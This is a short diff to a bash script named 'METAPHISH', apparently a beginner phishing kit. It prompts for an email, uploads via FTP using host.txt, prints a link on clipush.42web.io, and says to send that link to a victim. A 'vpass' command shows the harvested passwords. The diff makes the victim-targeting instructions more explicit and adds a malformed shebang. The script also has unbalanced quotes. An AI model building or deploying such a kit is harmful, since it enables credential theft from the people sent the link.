@@ -1,9 +1,10 @@
+#!bin/bash
 clear
 echo "METAPHISH STARTED..."
 echo
 echo "Tool By nerdhacker000 On Github, Made For Beginners"
 echo "---------------------------------------" 
-echo "1. Type your email (YOUREMAIL)"
+echo "1. Type your email and send link to target"
 echo "---------------------------------------" 
 echo "2. Type:"vpass"to view passwords
 echo "---------------------------------------" 
@@ -14,5 +15,6 @@ read email
 echo "..."
 echo
 ftp -s:host.txt
-echo "Successively hosted at: clipush.42web.io/$email
-echo - - - - 
+echo "Successively hosted at: http://clipush.42web.io/$email"
+echo "- - - - "
+echo Send link to victim
